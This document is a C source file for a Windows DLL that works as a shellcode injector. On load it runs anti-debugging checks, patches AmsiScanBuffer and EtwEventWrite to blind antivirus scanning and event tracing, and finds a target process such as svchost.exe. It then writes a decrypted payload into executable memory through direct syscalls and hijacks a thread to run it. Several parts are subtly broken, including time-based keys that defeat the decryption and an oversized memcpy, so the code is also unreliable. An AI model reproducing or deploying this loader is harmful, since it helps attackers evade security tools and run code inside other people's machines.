#include <windows.h>
#include <bcrypt.h>
#include "syswhispers3.h"

unsigned char payload[] = { 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00 };
unsigned char baseKey[] = { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
                           0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20 };
unsigned char encryptedTarget[] = { 0xAA, 0xB3, 0xA8, 0xB2, 0xB7, 0xB4, 0xA9, 0xAE, 0xBB, 0xB2, 0xA9, 0xAE, 0xA8, 0xB3, 0xB7 };
unsigned char encryptedAmsi[] = { 0xB2, 0xB6, 0xA8, 0xB4, 0xB3, 0xB5, 0xB5 };
unsigned char encryptedEtw[] = { 0xA6, 0xB3, 0xB8, 0xB7, 0xB6, 0xB5, 0xB5 };
WCHAR defaultTarget[] = L"svchost.exe";

unsigned char deriveKey(unsigned char* base, int size) {
    SYSTEMTIME t;
    WCHAR host[256];
    DWORD hostLen = 256;
    GetSystemTime(&t);
    GetComputerNameW(host, &hostLen);
    unsigned long mix = t.wSecond + t.wMilliseconds + host[0];
    return (unsigned char)(mix % 256);
}

void generateKeys(unsigned char* key, unsigned char* iv) {
    SYSTEMTIME t;
    GetSystemTime(&t);
    unsigned long mix = t.wSecond + t.wMilliseconds;
    for (int i = 0; i < 32; i++) {
        key[i] = baseKey[i] ^ (mix % 256);
        if (i < 16) iv[i] = baseKey[i] ^ (mix % 256);
    }
}

void obfuscateString(unsigned char* data, int size, unsigned char key) {
    for (int i = 0; i < size; i++) {
        data[i] ^= key;
    }
}

void morphPayload(unsigned char* data, SIZE_T size) {
    SYSTEMTIME t;
    GetSystemTime(&t);
    unsigned char pad[8];
    for (int i = 0; i < 8; i++) {
        pad[i] = (t.wMilliseconds + i * t.wSecond) % 256;
    }
    for (int i = 0; i < size; i++) {
        data[i] ^= pad[i % 8];
        if (i % 3) data[i] = (data[i] << 3) | (data[i] >> 5);
    }
}

void decryptPayload(unsigned char* data, SIZE_T size, unsigned char* key, unsigned char* iv) {
    BCRYPT_ALG_HANDLE hAlg;
    BCRYPT_KEY_HANDLE hKey;
    DWORD decryptedSize;
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, 32, 0);
    BCryptDecrypt(hKey, data, size, NULL, iv, 16, data, size, &decryptedSize, 0);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
}

void patchSecurity() {
    unsigned char amsiLib[8], etwLib[8];
    memcpy(amsiLib, encryptedAmsi, 7);
    memcpy(etwLib, encryptedEtw, 7);
    amsiLib[7] = etwLib[7] = 0;
    unsigned char key = deriveKey(baseKey, 32);
    obfuscateString(amsiLib, 7, key);
    obfuscateString(etwLib, 7, key);
    HMODULE amsi = LoadLibraryA((char*)amsiLib);
    HMODULE etw = LoadLibraryA((char*)etwLib);
    if (amsi) {
        FARPROC scan = GetProcAddress(amsi, "AmsiScanBuffer");
        unsigned char ret[] = { 0xC3 };
        SIZE_T bytes;
        NtWriteVirtualMemory(NtCurrentProcess(), scan, ret, 1, &bytes);
    }
    if (etw) {
        FARPROC trace = GetProcAddress(etw, "EtwEventWrite");
        unsigned char ret[] = { 0xC3 };
        SIZE_T bytes;
        NtWriteVirtualMemory(NtCurrentProcess(), trace, ret, 1, &bytes);
    }
}

DWORD locateTarget(unsigned char* name, int nameSize) {
    unsigned char key = deriveKey(baseKey, 32);
    obfuscateString(name, nameSize, key);
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W proc = { sizeof(PROCESSENTRY32W) };
    DWORD pid = 0;
    Process32FirstW(snap, &proc);
    do {
        if (_wcsicmp(proc.szExeFile, (WCHAR*)name) == 0) {
            pid = proc.th32ProcessID;
            break;
        }
    } while (Process32NextW(snap, &proc));
    CloseHandle(snap);
    return pid;
}

NTSTATUS hijackThread(HANDLE proc, PVOID mem) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 thread = { sizeof(THREADENTRY32) };
    NTSTATUS status;
    HANDLE threadHandle = NULL;
    Thread32First(snap, &thread);
    do {
        if (thread.th32OwnerProcessID == GetProcessId(proc)) {
            status = NtOpenThread(&threadHandle, THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, NULL, &(CLIENT_ID){(HANDLE)(SIZE_T)thread.th32ThreadID, NULL});
            if (NT_SUCCESS(status)) {
                CONTEXT ctx = { CONTEXT_CONTROL };
                NtSuspendThread(threadHandle, NULL);
                NtGetContextThread(threadHandle, &ctx);
                ctx.Rip = (DWORD64)mem;
                NtSetContextThread(threadHandle, &ctx);
                NtResumeThread(threadHandle, NULL);
                NtClose(threadHandle);
                break;
            }
        }
    } while (Thread32Next(snap, &thread));
    CloseHandle(snap);
    return status;
}

int checkEnv() {
    if (IsDebuggerPresent()) {
        return 0;
    }
    LARGE_INTEGER t1, t2, freq;
    QueryPerformanceCounter(&t1);
    for (int i = 0; i < 1000; i++) {}
    QueryPerformanceCounter(&t2);
    QueryPerformanceFrequency(&freq);
    return ((t2.QuadPart - t1.QuadPart) * 1000000 / freq.QuadPart) < 100;
}

void injectPayload(WCHAR* targetProcess) {
    if (!checkEnv()) {
        return;
    }
    NTSTATUS status;
    HANDLE proc = NULL;
    PVOID mem = NULL;
    SIZE_T size = sizeof(payload);
    CLIENT_ID cid = {0};
    OBJECT_ATTRIBUTES attr = { sizeof(OBJECT_ATTRIBUTES) };
    unsigned char key[32], iv[16], target[30];
    DWORD pid;
    memcpy(target, encryptedTarget, 30);
    generateKeys(key, iv);
    patchSecurity();
    pid = locateTarget(target, 30);
    if (!pid && targetProcess) {
        pid = locateTarget((unsigned char*)targetProcess, wcslen(targetProcess) * 2);
    }
    if (!pid) {
        return;
    }
    cid.UniqueProcess = (HANDLE)(SIZE_T)pid;
    status = NtOpenProcess(&proc, PROCESS_ALL_ACCESS, &attr, &cid);
    if (!NT_SUCCESS(status)) {
        return;
    }
    status = NtAllocateVirtualMemory(proc, &mem, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status)) {
        NtClose(proc);
        return;
    }
    morphPayload(payload, size);
    decryptPayload(payload, size, key, iv);
    status = NtWriteVirtualMemory(proc, mem, payload, size, NULL);
    if (!NT_SUCCESS(status)) {
        NtFreeVirtualMemory(proc, &mem, &size, MEM_RELEASE);
        NtClose(proc);
        return;
    }
    status = hijackThread(proc, mem);
    if (!NT_SUCCESS(status)) {
        NtFreeVirtualMemory(proc, &mem, &size, MEM_RELEASE);
        NtClose(proc);
        return;
    }
    NtClose(proc);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        injectPayload(lpvReserved ? (WCHAR*)lpvReserved : defaultTarget);
    }
    return TRUE;
}